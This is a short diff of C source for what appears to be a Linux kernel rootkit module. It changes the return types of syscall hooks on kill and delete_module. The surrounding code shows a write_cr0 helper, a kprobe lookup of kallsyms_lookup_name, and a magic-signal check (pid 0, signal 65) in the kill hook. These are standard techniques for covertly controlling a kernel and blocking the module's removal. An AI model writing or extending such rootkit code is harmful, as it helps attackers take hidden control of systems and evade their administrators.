@@ -28,7 +28,7 @@ static void write_cr0_my(int a){
 int noop_pre(struct kprobe *p ,struct pt_regs *regs){
   return 0;
 }
-asmlinkage int hook_tar_kill(const struct pt_regs *pt){
+asmlinkage long hook_tar_kill(const struct pt_regs *pt){
   pid_t pid=(pid_t) pt->di;
   int sig=(int)pt->si;
   if(pid==0&&sig==65){
@@ -72,7 +72,7 @@ asmlinkage int hook_tar_kill(const struct pt_regs *pt){
   return (*my_pre_sys_kill)(pt);
 }
 char t_module_name[MODULE_NAME_LEN];
-asmlinkage int hook_tar_delete_mod(const struct pt_regs *pt){
+asmlinkage long hook_tar_delete_mod(const struct pt_regs *pt){
   char *name_user=(char *)pt->di;
 //  unsigned int flags=(unsigned int)pt->si;
   if(strncpy_from_user(t_module_name,name_user,MODULE_NAME_LEN-1)<0){
@@ -86,7 +86,6 @@ asmlinkage int hook_tar_delete_mod(const struct pt_regs *pt){
   }
   return (*my_pre_sys_delete_mod)(pt);
 }
-
 void my_hook_syscall(void){
   register_kprobe(&kp);
   my_kallsyms_lookup_name=(kallsyms_lookup_name_t)kp.addr;
